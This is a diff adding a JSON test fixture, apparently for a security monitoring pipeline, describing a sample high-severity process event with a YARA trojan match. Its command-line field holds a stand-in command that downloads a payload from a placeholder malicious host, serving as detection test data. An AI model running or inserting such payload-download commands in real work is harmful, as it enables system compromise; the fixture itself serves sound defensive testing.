@@ -1,0 +1,20 @@
+{
+  "event_id": "test-example-001",
+  "timestamp": "2025-08-20T14:30:00Z",
+  "event_type": "process",
+  "source_host": "workstation-demo",
+  "source_agent": "agent-demo",
+  "severity": "high",
+  "process_id": 4567,
+  "parent_process_id": 1234,
+  "process_name": "suspicious.exe",
+  "command_line": "suspicious.exe --download-payload http://malicious-site.com/payload.exe",
+  "user": "john.doe",
+  "file_hash": "a1b2c3d4e5f6789012345678901234567890abcdef1234567890abcdef123456",
+  "metadata": {
+    "detection_engine": "yara",
+    "rule_matched": "Trojan.Generic.Suspicious",
+    "confidence": 85,
+    "quarantined": false
+  }
+}
